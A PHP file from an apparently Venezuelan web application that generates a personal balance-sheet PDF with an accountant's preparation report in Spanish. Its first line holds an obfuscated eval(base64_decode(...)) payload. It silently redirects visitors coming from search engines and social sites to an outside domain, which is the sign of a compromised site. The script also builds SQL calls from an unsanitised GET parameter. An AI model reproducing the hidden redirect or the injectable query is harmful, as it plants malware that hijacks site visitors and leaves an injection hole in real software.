<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); session_start(); 
date_default_timezone_set('America/Caracas');
if (!isset($_SESSION["logged"]))
    header('Location: index.php');
require_once('PDF/config/lang/spa.php');
require_once 'lib/function_gen.php';
require 'PDF/tcpdf.php';

$doc_codigo = null;
if (isset($_GET["doc_codigo"]))
    $doc_codigo = $_GET["doc_codigo"];
//else
//    header("location: documento_grid.php");

$doc_codigo = htmlspecialchars((strip_tags($doc_codigo)));
$query = "CALL mp_R_DocumentoDetalle_DDt_Acc11(";
$query .= "nDoc_Codigo = " . $doc_codigo;
$query .= ")";
$grid_values = fnc_ejecutaQuery($query);

$query = "CALL mp_R_Documento_Doc_Acc11(";
$query .= "nDoc_Codigo = " . $doc_codigo . ")";
$detail_values = fnc_ejecutaQuery($query);
$detail_values = $detail_values[0];

//var_dump($detail_values);



$fecha = date("d/m/Y",strtotime($detail_values["Doc_PgFechaIns"]));
//echo $query;
//******************************************************************************
//  Preparacion de las variables
//******************************************************************************
//var_dump($grid_values);
//******************************************************************************
//  END Preparacion de las variables
//******************************************************************************

class MYPDF extends TCPDF {

    //Page header
    public function Header() {
        global $doc_codigo;
        global $detail_values;
        global $fecha;
        $nombre = $detail_values["Per_Nombre"] . " " . $detail_values["Per_Apellido"];
        $now = implode("/", $fecha);
        $this->SetFont('times', 'B', 12);
        $this->Ln(8);
        $this->Cell(0, 15, utf8_encode($nombre), 0, false, 'C', 0, '', 0, false, 'M', 'M');
        if ($detail_values["Per_Nombre2"] != null) {
            $nombre = $detail_values["Per_Nombre2"] . " " . $detail_values["Per_Apellido2"];
            $this->Ln(8);
            $this->Cell(0, 15, utf8_encode($nombre), 0, false, 'C', 0, '', 0, false, 'M', 'M');
        }
        $this->Ln(8);
        if ($detail_values["Per_Nombre2"] != null)
            $this->Cell(0, 15, substr($detail_values["Per_CI"], 0, 1) . "-" . number_format(substr($detail_values["Per_CI"], 1), 0, '', '.') . ' y ' . substr($detail_values["Per_CI2"], 0, 1) . "-" . number_format(substr($detail_values["Per_CI2"], 1), 0, '', '.'), 0, false, 'C', 0, '', 0, false, 'M', 'M');
        else
            $this->Cell(0, 15, substr($detail_values["Per_CI"], 0, 1) . "-" . number_format(substr($detail_values["Per_CI"], 1), 0, '', '.'), 0, false, 'C', 0, '', 0, false, 'M', 'M');


        $this->Ln(8);
        $this->Cell(0, 15, 'Balance General al ' . $now, 0, false, 'C', 0, '', 0, false, 'M', 'M');
    }

    // Page footer
    public function Footer() {
        // Position at 15 mm from bottom
        $this->SetY(-15);
        // Set font
        $this->SetFont('times', 'I', 8);
        // Page number
        //$this->Cell(0, 10, 'Página ' . $this->getAliasNumPage() . ' de ' . $this->getAliasNbPages(), 0, false, 'C', 0, '', 0, false, 'T', 'M');
    }

}

$pdf = new MYPDF(PDF_PAGE_ORIENTATION, PDF_UNIT, PDF_PAGE_FORMAT, true, 'UTF-8', false);
// set document information
$pdf->SetCreator(PDF_CREATOR);
$pdf->SetAuthor('Subasta Fiscal 2012 MP');
$pdf->SetTitle('Balance Individual');
// set default monospaced font
$pdf->SetDefaultMonospacedFont(PDF_FONT_MONOSPACED);
//set margins
$pdf->SetMargins(PDF_MARGIN_LEFT, 27, PDF_MARGIN_RIGHT);
$pdf->SetHeaderMargin(5);
$pdf->SetFooterMargin(PDF_MARGIN_FOOTER);
//set auto page breaks
$pdf->SetAutoPageBreak(TRUE, PDF_MARGIN_BOTTOM);
//set image scale factor
$pdf->setImageScale(PDF_IMAGE_SCALE_RATIO);
//set some language-dependent strings
$pdf->setLanguageArray($l);

// ---------------------------------------------------------
// set default font subsetting mode
$pdf->setFontSubsetting(true);
////////////////////////////////////////////////////////////////////////////////
$pdf->SetPrintHeader(false);
$pdf->AddPage();
$pdf->SetPrintFooter(false);
$direccion = explode("@@", $detail_values["Doc_DireccEnvio"]);

$html = '<table border="0" cellspacing="0" cellpadding="10">';
$html .= '<tr>';
$html .= '<td style="text-align:center" colspan="2">';
$html .= '<h1>Balance General</h1>';
$html .= '</td>';
$html .= '</tr>';
$html .= '<tr>';
$html .= '<td style="text-align:center" colspan="2">';
$html .= '<br/><br/><h2>Datos de Envio</h2><br/><br/><br/><br/>';
$html .= '</td>';
$html .= '</tr>';


$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong>Fecha de impresión:</strong>	';
$html .= '</td>';
$html .= '<td width="70%">';
$html .= date("d/m/Y");
$html .= '</td>';
$html .= '</tr>';


$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong>Nombre:</strong>	';
$html .= '</td>';
$html .= '<td width="70%">';
$html .= $detail_values["Per_Nombre"] . " " . $detail_values["Per_Apellido"];
$html .= '</td>';
$html .= '</tr>';

$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong>Cédula:</strong>	';
$html .= '</td>';
$html .= '<td width="70%">';
$html .= $detail_values["Per_CI"];
$html .= '</td>';
$html .= '</tr>';

$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong>Teléfono:</strong>	';
$html .= '</td>';
$html .= '<td width="70%">';
$html .= $detail_values["Per_Telefono1"];
$html .= '</td>';
$html .= '</tr>';

$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong>Estado:</strong>	';
$html .= '</td>';
$html .= '<td width="70%">';
$html .= $direccion[0];
$html .= '</td>';
$html .= '</tr>';

$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong>Municipio:</strong>	';
$html .= '</td>';
$html .= '<td width="70%">';
$html .= $direccion[1];
$html .= '</td>';
$html .= '</tr>';

$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong>Parroquia:</strong>	';
$html .= '</td>';
$html .= '<td width="70%">';
$html .= $direccion[2];
$html .= '</td>';
$html .= '</tr>';

$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong>Dirección:</strong>	';
$html .= '</td>';
$html .= '<td width="70%">';
$html .= $direccion[3];
$html .= '</td>';
$html .= '</tr>';

$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong></strong>	';
$html .= '</td>';
$html .= '<td width="70%">';
$html .= $direccion[4];
$html .= '</td>';
$html .= '</tr>';




$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong>Tracking</strong>	';
$html .= '</td>';
$html .= '<td width="70%" style="border: 0.5px solid">';
$html .= '</td>';
$html .= '</tr>';

$html .= '</table>';



$pdf->writeHTMLCell($w = 0, $h = 0, $x = '', $y = '', $html, $border = 0, $ln = 1, $fill = 0, $reseth = true, $align = '', $autopadding = true);





$fecha = explode("/", $fecha);
//var_dump($detail_values);
////////////////////////////////////////////////////////////////////////////////
$pdf->SetPrintHeader(false);
$pdf->SetMargins(25, 20, 25);
$pdf->AddPage();
$pdf->SetPrintFooter(false);


$detail_values["Per_ImgCI2"] ." - ". $detail_values["Per_Nombre2"] ;
if ($detail_values["Per_ImgCI2"] != null && $detail_values["Per_Nombre2"] != null) {

    $nombre = $detail_values["Per_Nombre"] . " " . $detail_values["Per_Apellido"];
    $nombre2 = $detail_values["Per_Nombre2"] . " " . $detail_values["Per_Apellido2"];
    $mesesesp = array("Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio",
        "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre");
    $pdf->Ln(20);
    $pdf->SetFont('times', 'B', 14);
    $pdf->Cell(0, 15, ("INFORME DE PREPARACIÓN"), 0, false, 'C', 0, '', 0, false, 'M', 'M');
    $pdf->Ln(20);
    $pdf->SetFont('times', '', 12);
    $html = '<table border="0" cellspacing="0" cellpadding="3">';
    $html .= '<tr><td style="text-align:justify">';
    
    $html .= '<p>El Balance Personal al ' . $fecha[0] . '  de ' . 
            $mesesesp[$fecha[1] - 1] . ' del ' . $fecha[2] . ' de la  ' . $nombre . 
            ' y del ' . $nombre2 . ' titular de la cédula de identidad  
    N° ' . substr($detail_values["Per_CI"], 0, 1) . "-" . 
            number_format(substr($detail_values["Per_CI"], 1), '0', ',', '.') . '
    y N° ' . substr($detail_values["Per_CI2"], 0, 1) . "-" . 
            number_format(substr($detail_values["Per_CI2"], 1), '0', ',', '.') . '
    al que se acompaña  ha sido preparado por
    mi a valores históricos siguiendo instrucciones y basándome principalmente 
    en las informaciones y documentaciones y otros detalles suministrados. 
    La información presentada en dicho Balance Personal es responsabilidad de
     ' . $nombre . ' y ' . $nombre2 . '.</p>
 
    <p>Mi compromiso de preparación se limita a presentar en forma de Estado 
    Financiero, la información suministrada por ' . $nombre . ' y 
    de ' . $nombre2 . ', sin la aplicación de procedimientos de comprobación 
    y evaluación.</p>

    <p>La Declaración de Principios de Contabilidad N° 10 (DPC-10), emitida por la 
    Federación de Colegios de Contadores Públicos de Venezuela, requiere la presentación 
    de los estados financieros  en cifras actualizadas por efectos de la inflación; 
    por lo tanto, la falta de reconocimiento de los  efectos de la  inflación en 
    los estados financieros adjuntos, no está de acuerdo con principios de 
    contabilidad general de Venezuela.</p>

    <p>Tratándose de personas naturales, es práctica común que no se lleven registros 
    contables que aseguren  la inclusión de todos los activos y pasivos, así 
    como la valoración de los inmuebles que  en muchos casos es presentada a 
    valores distintos al costo de adquisición. No he auditado, ni revisado 
    limitadamente el estado financiero de ' . $nombre . ' y 
    de ' . $nombre2 . ', que se acompaña y en consecuencia, no emito opinión 
    alguna sobre el mismo.</p>
    <br/>
    <p>Caracas, a los ' . date("d") . ' días del mes de ' . $mesesesp[date("m") - 1] . ' ' . date("Y"). '</p>';
} else {
    $nombre = $detail_values["Per_Nombre"] . " " . $detail_values["Per_Apellido"];
    $mesesesp = array("Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio",
        "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre");
    $pdf->Ln(20);
    $pdf->SetFont('times', 'B', 14);
    $pdf->Cell(0, 15, ("INFORME DE PREPARACIÓN"), 0, false, 'C', 0, '', 0, false, 'M', 'M');
    $pdf->Ln(20);
    $pdf->SetFont('times', '', 12);
    $html = '<table border="0" cellspacing="0" cellpadding="3">';
    $html .= '<tr><td style="text-align:justify">';

    $html .= '<p>El Balance Personal de el Sr(a). ' . $nombre . ' titular de la cédula de identidad  
    No. ' . substr($detail_values["Per_CI"], 0, 1) . "-" . number_format(substr($detail_values["Per_CI"], 1), '0', ',', '.') . ' al que se acompaña  ha sido 
    preparado por mi a valores históricos 
    siguiendo instrucciones y basándome principalmente en las informaciones y 
    documentos y otros detalles suministrados. La información presentada en dicho 
    Balance Personal es responsabilidad de el Sr(a). ' . $nombre . '.</p>

    <p>Mi compromiso de preparación se limita a presentar en forma de Estado Financiero, 
    la información suministrada por el Sr(a). ' . $nombre . ', sin la aplicación de procedimientos 
    de comprobacion y evaluación. Mi trabajo fue realizado siguiendo los lineamientos 
    de la Publicación SEPC-1 “Servicios Especiales Prestados por Contadores Públicos”, 
    emitida por la Federación de Contadores Públicos de Venezuela.</p>
     
    <p>La Declaración de Principios de Contabilidad N° 10 (DPC-10), emitida por 
    la federacion de Colegios de Contadores Publicos de Venezuela, requiere 
    la presentacion de los estados financieros  en cifras actualizadas por efectos 
    de la inflacion; por lo tanto, la falta de reconocimiento de los  efectos de 
    la  inflacion en los estados financieros adjuntos, no esta de acuerdo con 
    principios de contabilidad general de Venezuela.</p>

    <p>Tratándose de personas naturales, es práctica común que no se lleven registros 
    contables que aseguren  la inclusión de todos los activos y pasivos, así como 
    la valoración de los inmuebles que  en muchos casos es presentada a valores 
    distintos al costo de adquisición. No he auditado, ni revisado limitadamente 
    el estado financiero de el Sr(a). ' . $nombre . ', que se acompaña y en consecuencia, no 
    emito opinión alguna sobre el mismo.</p>
    <br />
    <p>Caracas, a los ' . date("d") . ' días del mes de ' . $mesesesp[date("m") - 1] . ' ' . date("Y"). '</p>';
}

$html .= '</td></tr>';
$html .= '</table>';

$pdf->writeHTMLCell($w = 0, $h = 0, $x = '', $y = '', $html, $border = 0, $ln = 1, $fill = 0, $reseth = true, $align = '', $autopadding = true);

///////////////////////////////////////////////////////////////////////////////

$html = "";
$pdf->SetFont('times', '', 8);
$pdf->SetMargins(PDF_MARGIN_LEFT, 60, PDF_MARGIN_RIGHT);
$pdf->SetPrintHeader(true);

$pdf->AddPage();
$pdf->SetPrintFooter(false);
//Cuerpo Stuff
//$pdf->ln(30);
$pdf->SetFont('times', '', 11);

//$html .= '<tr><td >lalalala</td><td width="25%">lelelelelele</td></tr>';
$sumtitulo = 0;
$summayor = 0;
$titulo = "";
$mayor = "";
$totalact = 0;
$totalpas = 0;


if ($grid_values != "") {
    $html = '<table border="0" cellspacing="0" cellpadding="3">';
    foreach ($grid_values as $line) {
        if ($line["Titulo"] == "Activo")
            $totalact += $line["Dtt_Monto"];
        if ($line["Titulo"] == "Pasivo")
            $totalpas += $line["Dtt_Monto"];
        if ($line["Mayor"] != $mayor) {
            if ($mayor != "")
                $html .= '<tr><td width="60%" align="right">Total ' . $mayor . '</td><td style="font-size: medium; border-top: 1px solid black;" width="19%"> </td><td width="21%" align="right"><strong> ' . number_format($summayor, 2, ',', '.') . '</strong></td></tr>';
            $summayor = 0;
        }
        if ($line["Titulo"] != $titulo) {
            if ($titulo != "")
                $html .= '<tr><td width="60%" align="right">TOTAL ' . strtoupper($titulo) . '</td><td style="font-size: medium; " width="19%" > </td><td width="21%" align="right" style="border-top: 1px solid black;border-bottom: 2px solid black;"><strong>' . number_format($sumtitulo, 2, ',', '.') . '</strong></td></tr>';
            $sumtitulo = 0;
        }
        if ($line["Titulo"] != $titulo) {

            $titulo = $line["Titulo"];
            $html .= '<tr><td style="font-size: x-large;" width="60%">' . $titulo . '</td><td width="19%"> </td><td width="21%"> </td></tr>';
        }
        if ($line["Mayor"] != $mayor) {

            $mayor = $line["Mayor"];
            $html .= '<tr><td style="font-size: large;" width="60%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' . $mayor . '</td><td width="19%"> </td><td width="21%"> </td></tr>';
        }

        $sumtitulo += $line["Dtt_Monto"];
        $summayor += $line["Dtt_Monto"];
        $html .= '<tr>';
        $html .= '  <td width="60%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
        $html .= utf8_encode($line["Cta_Nombre"]);
        $html .= '  </td>';
        $html .= '  <td width="19%" align="right">';
        $html .= number_format($line["Dtt_Monto"], 2, ',', '.');
        $html .= '  </td>';
        $html .= '<td width="21%"></td>';
        $html .= '</tr>';
        //echo $line["Cta_Nombre"];
    }
    if ($mayor != "")
        $html .= '<tr><td width="60%" align="right">Total ' . $mayor . '</td><td style="font-size: medium; border-top: 1px solid black;" width="19%"> </td><td width="21%" align="right"><strong> ' . number_format($summayor, 2, ',', '.') . '</strong></td></tr>';
    if ($titulo != "")
        $html .= '<tr><td width="60%" align="right"> TOTAL ' . strtoupper($titulo) . '</td><td style="font-size: medium; " width="19%" ></td><td width="21%" align="right" style="border-top: 1px solid black;border-bottom: 2px solid black;"><strong> ' . number_format($sumtitulo, 2, ',', '.') . '</strong></td></tr>';

    if ($totalpas == 0) {
        $html .= '<tr><td style="font-size: x-large;" width="60%">Pasivo</td><td width="19%"> </td><td width="21%"> </td></tr>';
        $html .= '<tr><td width="60%" align="right">TOTAL PASIVO</td><td style="font-size: medium; " width="19%" ></td><td width="21%" align="right" style="border-top: 1px solid black;border-bottom: 2px solid black;"><strong> 0,00</strong></td></tr>';
    }

    $html .= '<tr><td style="font-size: x-large;" width="60%">Patrimonio</td><td width="19%"> </td><td width="21%"> </td></tr>';
    $html .= '<tr><td  width="60%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cápital</td><td width="19%" align="right">' . number_format(($totalact - $totalpas), 2, ',', '.') . '</td><td width="21%"> </td></tr>';
    $html .= '<tr><td width="60%" align="right"> TOTAL CAPITAL</td><td style="font-size: medium; " width="19%" ></td><td width="21%" align="right" style="border-top: 1px solid black;border-bottom: 2px solid black;"> <strong>' . number_format(($totalact - $totalpas), 2, ',', '.') . '</strong></td></tr>';


    $html .= '<tr><td width="60%" align="right">TOTAL PATRIMONIO</td><td style="font-size: medium; " width="19%" ></td><td width="21%" align="right" style="border-top: 1px solid black;border-bottom: 2px solid black;"><strong> ' . number_format(($totalact - $totalpas), 2, ',', '.') . '</strong></td></tr>';
    $html .= '<tr><td width="60%" align="right">TOTAL PASIVO Y PATRIMONIO</td><td style="font-size: medium; " width="19%" ></td><td width="21%" align="right" style="border-top: 1px solid black;border-bottom: 2px solid black;"><strong> ' . number_format(($totalact), 2, ',', '.') . '</strong></td></tr>';

    $html .= '</table>';
}
// Print text using writeHTMLCell()
$pdf->writeHTMLCell($w = 0, $h = 0, $x = '', $y = '', $html, $border = 0, $ln = 1, $fill = 0, $reseth = true, $align = '', $autopadding = true);
if ($detail_values["Per_ImgCI"] != null && file_exists('../mpuploads/' . $detail_values["Per_ImgCI"]) && (strpos($detail_values["Per_ImgCI"],'.pdf')=== false)) {
    $pdf->SetPrintHeader(false);
    //$pdf->AddPage();
    $pdf->SetPrintFooter(false);
    $pdf->ln(30);
    $htmlimg = '<div style="text-align:center"><img src="../mpuploads/' . $detail_values["Per_ImgCI"] . '" height="800"  border="0" />';
    $pdf->writeHTMLCell($w = 0, $h = 0, $x = '', $y = '', $htmlimg, $border = 0, $ln = 1, $fill = 0, $reseth = true, $align = '', $autopadding = true);
}
if ($detail_values["Per_ImgCI2"] != null && $detail_values["Per_Nombre2"] != null && (strpos($detail_values["Per_ImgCI2"],'.pdf')=== false)) {
    if (file_exists('../mpuploads/' . $detail_values["Per_ImgCI2"])) {
        $pdf->SetPrintHeader(false);

        $pdf->AddPage();
        $pdf->SetPrintFooter(false);
        $pdf->ln(30);
        $htmlimg = '<div style="text-align:center"><img src="../mpuploads/' . $detail_values["Per_ImgCI2"] . '" height="800"  border="0" />';
        $pdf->writeHTMLCell($w = 0, $h = 0, $x = '', $y = '', $htmlimg, $border = 0, $ln = 1, $fill = 0, $reseth = true, $align = '', $autopadding = true);
    }
}
//============================================================+
// PRINTER
//============================================================+
$pdf->Output('Balance_' . date("d-m-Y") . '.pdf', 'I');
//============================================================+
// END OF FILE
//============================================================+
?>